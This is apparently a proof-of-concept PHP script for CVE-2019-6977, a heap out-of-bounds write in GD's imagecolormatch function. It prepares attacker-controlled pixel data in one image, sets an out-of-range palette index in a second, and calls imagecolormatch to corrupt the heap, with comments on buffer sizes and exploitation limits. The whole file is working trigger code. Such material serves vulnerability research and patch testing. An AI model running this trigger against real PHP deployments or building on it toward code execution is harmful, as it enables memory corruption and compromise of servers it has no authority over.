<?php
# CVE-2019-6977
# https://bugs.php.net/bug.php?id=77270
# 
# Not usable with Gollum as we can only control the LSB of every 8th byte. The 'bp' 
# pointer that is used in the OOB write has type (unsigned long *).
$img1 = imagecreatetruecolor(8, 16);
# Prevent the alpha value being blended into the RGB values in imagesetpixel
imageAlphaBlending($img1, false);
# Set the pixels in img1 that will be used as the overflow contents. 
for ($i = 0; $i < 16; $i++, $val++) {
    for ($j = 0; $j < 8; $j += 2) {
	# Each pixel is represented by a 32-bit value (Alpha, R, G, B). Here we set
	# 64-bit values in two steps. The R, G and B values are unconstrained, while
	# the alpha value has to be <= 0x7f. 
    	$val = 0x41;
	$pixel = $val | ($val + 1 << 8) | ($val + 2 << 16) | ($val + 3 << 24);
	imagesetpixel($img1, $j, $i, $pixel);
	$val += 4;
	$pixel = $val | ($val + 1 << 8) | ($val + 2 << 16) | ($val + 3 << 24);
	imagesetpixel($img1, $j + 1, $i, $pixel);
    }
}

# img1 and img2 must have the same size
$img2 = imagecreate(8, 16);
# Allocate a single color. The following then allocates a buffer of size 40
# buf = (unsigned long *)safe_emalloc(sizeof(unsigned long), 5 * im2->colorsTotal, 0);
imagecolorallocate($img2, 0, 0, 0);
# Set img2[0][0] = 0xff
imagesetpixel($img2, 0, 0, 255);
imagecolormatch($img1, $img2);
?>
